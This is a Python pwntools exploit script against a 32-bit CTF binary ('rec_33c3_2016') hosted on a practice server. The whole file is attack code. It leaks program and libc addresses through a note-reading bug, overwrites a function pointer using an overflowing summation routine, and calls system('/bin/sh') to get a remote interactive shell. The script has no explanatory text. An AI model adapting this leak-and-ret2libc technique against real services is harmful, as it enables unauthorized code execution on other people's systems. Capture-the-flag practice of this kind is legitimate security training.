#!/usr/bin/env python


from pwn import *
import subprocess
import sys
import time
import numpy

HOST = "buuoj.cn"
PORT = 20008
ELF_PATH = "./rec_33c3_2016"
LIBC_PATH = ""

# setting 

context.arch = 'i386'
context.os = 'linux'
context.endian = 'little'
context.word_size = 32
# ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']

context.log_level = 'INFO'

elf = ELF(ELF_PATH)

def take_note(note):
    r.sendlineafter("> ", "0")
    r.sendlineafter("note: ", note)

def read_note():
    r.sendlineafter("> ", "1")

def polish_sum(nums):
    r.sendlineafter("> ", "2")
    r.sendlineafter("Operator:", "S")
    for num in nums:
        print "adding:", num
        r.sendlineafter("Operand:", str(num))

    r.sendlineafter("Operand:", ".")

def sign(num):
    r.sendlineafter("> ", "5")
    r.sendline(str(num))


if __name__ == "__main__":

    r = remote(HOST, PORT)
    #r = process(ELF_PATH)

    
    take_note("123")
    read_note()

    r.recvuntil("note: ")
    fptr_addr = u32(r.recv(4)) - 0x350 # where the function pointer be loaded

    text_base = u32(r.recv(4)) - 0x6fb
    puts = text_base + 0x520
    lsm_got = text_base + 0x2fe0
    puts_got = text_base + 0x2fd8
    
    log.success("fptr_addr: "+hex(fptr_addr))
    log.success("text_base: "+hex(text_base))

    nums = [i for i in xrange(0x63)] + [puts, lsm_got]
    polish_sum(nums)

    sign(0) # this will call puts(lsm_got)

    lsm_addr = u32(r.recv(4))
    #########################################

    #offset___libc_start_main = 0x0018540

    #offset_system = 0x0003a940

    #offset_str_bin_sh = 0x15902b

    #########################################

    system_addr = lsm_addr + 0x0003a940- 0x18540
    bin_sh = lsm_addr + 0x15902b- 0x18540
    
    log.success("lsm: "+hex(lsm_addr))
    log.success("system: "+hex(system_addr))
    log.success("bin_sh: "+hex(bin_sh))

    nums = [i for i in xrange(0x63)] + [numpy.int32(system_addr), numpy.int32(bin_sh)]
    polish_sum(nums)
    sign(0) # this time will call system("/bin/sh")

    
    r.interactive()